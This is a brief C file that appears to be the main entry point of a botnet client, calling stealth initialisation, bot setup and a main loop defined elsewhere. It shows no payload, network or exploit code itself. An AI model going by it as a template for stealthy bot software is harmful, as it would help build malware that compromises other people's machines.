#include "../../include/botnet.h"

int main(int argc, char *argv[]) {
    // Initialize stealth features first
    stealth_init(argc, argv);

    // Initialize the rest of the bot
    bot_init();

    // Start the bot's main loop
    bot_start();

    return 0; // Should never be reached
}
